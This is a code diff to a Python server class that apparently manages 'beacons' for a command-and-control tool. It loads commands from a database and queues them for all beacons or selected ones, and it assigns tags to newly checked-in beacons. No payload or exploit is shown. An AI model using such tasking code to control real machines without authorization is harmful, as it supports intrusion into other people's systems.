@@ -23,12 +23,13 @@ class Server:
         self.sock = None
         self.db = None
         self.commands = []
-        self.beacons = []
+        self.beacons = []       # list of beacons
         self.f = False
         self.fName = None
         self.fSize = 0
         self.sendAll = False    # send to all beacons
         self.bList = []         # list of specific beacons
+        
     """
         Function to start the server with the information
         in the server
@@ -71,16 +72,24 @@ class Server:
     def load_command(self, name, db):
         c = db.cursor()
         c.execute("SELECT cmd from commands WHERE name=?", (name,))
-        for cmd in c.fetchall(): self.commands += [str(cmd[0])]
-
+        for cmd in c.fetchall(): 
+            if self.sendAll:
+                self.commands += [str(cmd[0])]
+            else:
+                for x in self.bList:
+                    x.cmds += [str(cmd[0])]
     """
         Function to add a new beacon to the servers list of active beacons
 
         addr - the ip addr the beacon signalled from 
     """
     def add_beacon(self, addr):
-        t= time.localtime()
+        t = time.localtime()
         strtime = (str(t.tm_hour), str(t.tm_min), str(t.tm_sec))
-        strtime = ":".join(strtime) 
-        newB = beacon.Beacon(addr, 0, strtime, (t.tm_hour, t.tm_min, t.tm_sec))
+        strtime = ":".join(strtime)
+        newTag = 0
+        for x in self.beacons:
+            if x.tag == newTag:
+                newTag += 1
+        newB = beacon.Beacon(addr, newTag, strtime, (t.tm_hour, t.tm_min, t.tm_sec))
         self.beacons += [newB]
